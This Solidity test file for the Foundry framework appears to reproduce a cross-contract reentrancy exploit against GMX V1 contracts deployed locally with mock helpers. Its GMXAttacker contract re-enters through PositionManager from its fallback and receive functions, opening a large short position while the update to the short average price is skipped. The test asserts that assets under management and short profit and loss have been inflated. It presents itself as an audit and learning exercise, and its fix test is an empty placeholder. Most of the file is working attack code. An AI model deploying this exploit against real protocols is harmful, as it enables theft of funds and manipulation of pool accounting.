// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Import contracts
import "../src/gmxV1/vault.sol";
import "../src/gmxV1/OrderBook.sol";
import "../src/gmxV1/PositionManager.sol";
import "../src/gmxV1/Router.sol";

// Mock helper contracts
contract MockShortsTracker {
    function updateGlobalShortData(
        address account,
        address collateralToken,
        address indexToken,
        bool isLong,
        uint256 sizeDelta,
        uint256 markPrice,
        bool isIncrease
    ) external {
        // Normally would update globalShortAveragePrices
        // But attacker bypasses this update through reentrancy
    }
}

contract MockTimelock {
    function enableLeverage(address vault) external {
        Vault(vault).setIsLeverageEnabled(true);
    }
    
    function disableLeverage(address vault) external {
        Vault(vault).setIsLeverageEnabled(false);
    }
}

contract MockWETH {
    mapping(address => uint256) public balanceOf;
    
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// 🚨 Attacker Contract - Demonstrates Cross-Contract Reentrancy
contract GMXAttacker {
    Vault public vault;
    OrderBook public orderBook;
    PositionManager public positionManager;
    
    address public wbtc = address(0x2);
    uint256 public attackStep = 0;
    bool public attacking = false;
    
    constructor(
        address _vault,
        address _orderBook,
        address _positionManager
    ) {
        vault = Vault(_vault);
        orderBook = OrderBook(payable(_orderBook));
        positionManager = PositionManager(_positionManager);
    }
    
    // Start the attack sequence
    function startAttack() external payable {
        console.log("=== GMX REENTRANCY ATTACK INITIATED ===");
        
        // Create decrease order (bait to trigger attack)
        orderBook.createDecreaseOrder{value: 0.01 ether}(
            wbtc,           // indexToken
            1000,           // sizeDelta  
            wbtc,           // collateralToken
            100,            // collateralDelta
            false,          // isLong
            60000,          // triggerPrice
            false           // triggerAboveThreshold
        );
        
        console.log("Attack state BEFORE:");
        logVaultState();
    }
    
    // 🚨 Core reentrancy attack function - 使用真实攻击路径
    fallback() external payable {
        if (!attacking && msg.sender == address(orderBook)) {
            attacking = true;
            attackStep++;
            
            console.log("=== REENTRANCY ATTACK TRIGGERED ===");
            console.log("Reentrancy step:", attackStep);
            
            // 🔧 FIX: 使用真实攻击路径 - 通过 PositionManager 调用
            console.log("Executing attack: Opening massive short position via PositionManager...");
            
            // 真实攻击：通过有权限的 PositionManager 调用 Vault
            address[] memory path = new address[](1);
            path[0] = wbtc;
            
            positionManager.increasePosition(
                path,           // _path
                wbtc,          // _indexToken
                0,             // _amountIn
                0,             // _minOut
                10000000,      // _sizeDelta - massive short position
                false,         // _isLong
                60000          // _price
            );
            
            console.log("Reentrancy attack completed, checking state changes:");
            logVaultState();
            
            attacking = false;
        }
    }
    
    receive() external payable {
        if (!attacking && msg.sender == address(orderBook)) {
            attacking = true;
            attackStep++;
            
            console.log("=== REENTRANCY VIA RECEIVE FUNCTION ===");
            console.log("Reentrancy step:", attackStep);
            
            // 🔧 使用真实攻击路径
            address[] memory path = new address[](1);
            path[0] = wbtc;
            
            positionManager.increasePosition(
                path,           // _path
                wbtc,          // _indexToken
                0,             // _amountIn
                0,             // _minOut
                10000000,      // _sizeDelta
                false,         // _isLong
                60000          // _price
            );
            
            console.log("Reentrancy attack completed via receive");
            logVaultState();
            
            attacking = false;
        }
    }
    
    function logVaultState() internal view {
        console.log("globalShortSizes[WBTC]:", vault.globalShortSizes(wbtc));
        console.log("globalShortAveragePrices[WBTC]:", vault.globalShortAveragePrices(wbtc));
        console.log("AUM:", vault.getAum());
        console.log("Short PnL:", vault.getGlobalShortPnl());
    }
}

// 🧪 Complete Attack Test Suite
contract AttackTest is Test {
    Vault vault;
    OrderBook orderBook;
    PositionManager positionManager;
    Router router;
    MockShortsTracker shortsTracker;
    MockTimelock timelock;
    MockWETH weth;
    GMXAttacker attacker;
    
    address wbtc = address(0x2);
    address keeper = address(0x123);
    
    function setUp() public {
        console.log("=== SETTING UP GMX V1 TEST ENVIRONMENT ===");
        
        // Deploy helper contracts
        weth = new MockWETH();
        shortsTracker = new MockShortsTracker();
        timelock = new MockTimelock();
        
        // Deploy core contracts
        vault = new Vault();
        router = new Router(address(vault), address(weth));
        orderBook = new OrderBook(address(router), address(vault), address(weth));
        positionManager = new PositionManager(
            address(vault),
            address(router),
            address(shortsTracker),
            address(weth),
            address(orderBook),
            address(timelock)
        );
        
        // 🔧 FIX: Setup ALL required permissions
        vault.setManager(address(router), true);
        vault.setManager(address(positionManager), true);
        vault.setManager(address(timelock), true);  // 🚨 CRITICAL: timelock needs manager permission
        
        router.addPlugin(address(orderBook));
        
        positionManager.setOrderKeeper(keeper, true);
        
        // Deploy attacker contract
        attacker = new GMXAttacker(
            address(vault),
            address(orderBook),
            address(positionManager)
        );
        
        // Fund attacker with ETH
        vm.deal(address(attacker), 10 ether);
        vm.deal(address(orderBook), 1 ether);
        
        // Setup initial state
        setupInitialState();
        
        console.log("Test environment setup completed");
    }
    
    function setupInitialState() internal {
        // Set initial pool funds
        vault.setPoolAmount(wbtc, 1000 * 10**8); // 1000 BTC
        
        // Set initial short data (simulate normal trading state)
        vault.setGlobalShortData(
            wbtc,
            1000000,     // Small initial short size
            60000        // Normal average price
        );
        
        // 🔧 FIX: Give attacker an initial position to decrease
        // This simulates that the attacker already has a short position
        vault.setInitialPosition(
            address(attacker),
            wbtc,          // collateralToken
            wbtc,          // indexToken
            5000,          // position size (bigger than the 1000 decrease order)
            false,         // isLong = false (short position)
            60000          // average price
        );
        
        // 🚨 CRITICAL: 攻击者需要批准 OrderBook 插件（用于减仓）
        vm.prank(address(attacker));
        router.approvePlugin(address(orderBook));
        
        // 🚨 CRITICAL: 攻击者需要是 PositionManager 的合法用户（用于重入攻击）
        // 在真实场景中，攻击者会先成为正常用户
        positionManager.setPartner(address(attacker), true);
        
        console.log("Initial position created for attacker - size: 5000");
        console.log("Attacker authorized for PositionManager");
    }
    
    function testGMXReentrancyAttack() public {
        console.log("=== COMPLETE GMX REENTRANCY ATTACK TEST ===");
        
        // Record state before attack
        uint256 aumBefore = vault.getAum();
        uint256 shortSizesBefore = vault.globalShortSizes(wbtc);
        uint256 shortAvgPriceBefore = vault.globalShortAveragePrices(wbtc);
        uint256 shortPnlBefore = vault.getGlobalShortPnl();
        
        console.log("=== STATE BEFORE ATTACK ===");
        console.log("AUM:", aumBefore);
        console.log("globalShortSizes[WBTC]:", shortSizesBefore);
        console.log("globalShortAveragePrices[WBTC]:", shortAvgPriceBefore);
        console.log("Short PnL:", shortPnlBefore);
        
        // Step 1: Attacker creates decrease order
        console.log("\n=== STEP 1: ATTACKER CREATES DECREASE ORDER ===");
        attacker.startAttack{value: 1 ether}();
        
        // Step 2: Keeper executes order, triggering reentrancy attack
        console.log("\n=== STEP 2: KEEPER EXECUTES ORDER, TRIGGERING REENTRANCY ===");
        vm.prank(keeper);
        positionManager.executeDecreaseOrder(
            address(attacker),  // account
            0,                  // orderIndex
            payable(keeper)     // feeReceiver
        );
        
        // Record state after attack
        uint256 aumAfter = vault.getAum();
        uint256 shortSizesAfter = vault.globalShortSizes(wbtc);
        uint256 shortAvgPriceAfter = vault.globalShortAveragePrices(wbtc);
        uint256 shortPnlAfter = vault.getGlobalShortPnl();
        
        console.log("\n=== STATE AFTER ATTACK ===");
        console.log("AUM:", aumAfter);
        console.log("globalShortSizes[WBTC]:", shortSizesAfter);
        console.log("globalShortAveragePrices[WBTC]:", shortAvgPriceAfter);
        console.log("Short PnL:", shortPnlAfter);
        
        // Calculate attack impact
        console.log("\n=== ATTACK IMPACT ANALYSIS ===");
        console.log("AUM change:", aumAfter > aumBefore ? aumAfter - aumBefore : 0);
        console.log("Short size change:", shortSizesAfter - shortSizesBefore);
        console.log("Short PnL change:", shortPnlAfter > shortPnlBefore ? shortPnlAfter - shortPnlBefore : 0);
        
        // Verify attack success
        assertGt(aumAfter, aumBefore, "AUM should be artificially inflated");
        assertGt(shortSizesAfter, shortSizesBefore, "Short size should increase dramatically");
        assertEq(shortAvgPriceAfter, shortAvgPriceBefore, "Short average price should NOT update (this is the bug)");
        assertGt(shortPnlAfter, shortPnlBefore, "Short PnL should increase (fake losses)");
        
        console.log("\n=== ATTACK VERIFICATION COMPLETE ===");
        console.log("SUCCESS: Reentrancy attack successful - AUM manipulated, short data inconsistent");
        console.log("LEARNING: This demonstrates the power of cross-contract reentrancy attacks");
        console.log("VULNERABILITY: State updates after ETH transfer, bypassed by reentrancy attack");
    }
    
    // Additional test: Verify fix approach
    function testReentrancyFix() public pure {
        // This is a placeholder for testing reentrancy fixes
        // In a real audit, you would implement and test the fix here
    }
}